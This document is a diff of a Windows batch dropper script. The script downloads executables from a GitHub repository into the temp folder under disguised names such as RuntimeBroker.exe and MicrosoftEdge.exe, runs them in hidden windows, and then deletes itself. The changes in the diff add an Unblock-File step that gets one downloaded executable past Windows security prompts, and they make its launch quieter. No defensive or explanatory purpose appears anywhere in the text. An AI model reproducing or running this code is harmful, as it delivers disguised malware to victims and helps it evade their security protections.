@@ -6,8 +6,13 @@ if %errorlevel% == 0 (
     powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
     powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zzzzz.exe' -OutFile '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
     powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%TEMP%\ThirdFile.exe'" >nul 2>&1
+
+    rem Unblock the ThirdFile.exe to avoid any execution blocks
+    powershell -Command "Unblock-File -Path '%TEMP%\ThirdFile.exe'" >nul 2>&1
+
     powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
-    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\ThirdFile.exe'" >nul 2>&1
+    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\ThirdFile.exe' -NoNewWindow" >nul 2>&1
+
     del "%~f0" >nul 2>&1
     exit
 )
@@ -23,7 +28,12 @@ powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56
 powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zzzzz.exe' -OutFile '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%TEMP%\ThirdFile.exe'" >nul 2>&1
+
+rem Unblock the ThirdFile.exe to avoid any execution blocks
+powershell -Command "Unblock-File -Path '%TEMP%\ThirdFile.exe'" >nul 2>&1
+
 powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
-powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\ThirdFile.exe'" >nul 2>&1
+powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\ThirdFile.exe' -NoNewWindow" >nul 2>&1
+
 del "%~f0" >nul 2>&1
 exit
